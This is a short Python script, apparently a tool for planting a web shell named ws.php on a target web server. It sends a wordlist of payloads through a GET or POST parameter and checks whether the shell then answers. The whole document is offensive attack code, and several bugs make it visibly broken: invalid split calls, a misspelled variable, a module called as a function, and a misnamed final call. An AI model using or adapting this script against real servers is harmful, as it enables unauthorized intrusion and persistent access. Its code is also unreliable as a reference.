import socket
import urllib.parse as pr
requirements=__import__("sys").argv
url=requirements[1]
method=requirements[2]
data=requirements[3]
indexlist=open(requirements[4],"r")
wordlist=open(requirements[5],"r")
def shell_upload():
    server1=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server2=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    global url,method,data,indexlist,wordlist
    isconnected=0
    try:
        server1.connect((url.split("@")[0],80))
        isconnected=1
    except:
        print("[*] Unable To Reach The Server : (")
        __import__('sys').exit()
    if isconnected:
        server2.connect((url.split("@")[0],80))
        for index in indexlist:
            for payload in wordlist:
                paylaod=payload.format(index+'ws.php')
                if method=="GET":
                    query1=f'GET /{url.split(@)[1]}?{data}={pr(payload)} HTTP/1.1\r\nHost:{url.split("@")[0]}\r\nConnection: Close\r\n\r\n'
                elif method=='POST':
                    query1=f'POST /{url.split(@)[1]} HTTP/1.1\r\nHost:{url.split("@")[0]}\r\nContent-Length:{len(data+"="+pr(payload))}\r\nContent-Type:application/x-www-urlencoded\r\nConnection: Close\r\n\r\n{data}={pr(payload)}'
                query2=f'GET /{index}'
                server1.send(bytes(query1,"us-ascii"))
                query2=f'GET /ws.php HTTP/1.1\r\nHost:{url.split("@")[0]}\r\nConnection: Close\r\n\r\n'
                server2.send(bytes(query2,"us-ascii"))
                if '200 OK' in server2.recv(1024).decode('us-ascii').split('\r\n')[0]:
                    print('uploaded successfuly')
                    indexlist.close()
                    wordlist.close()
                    break
hell_upload()

    


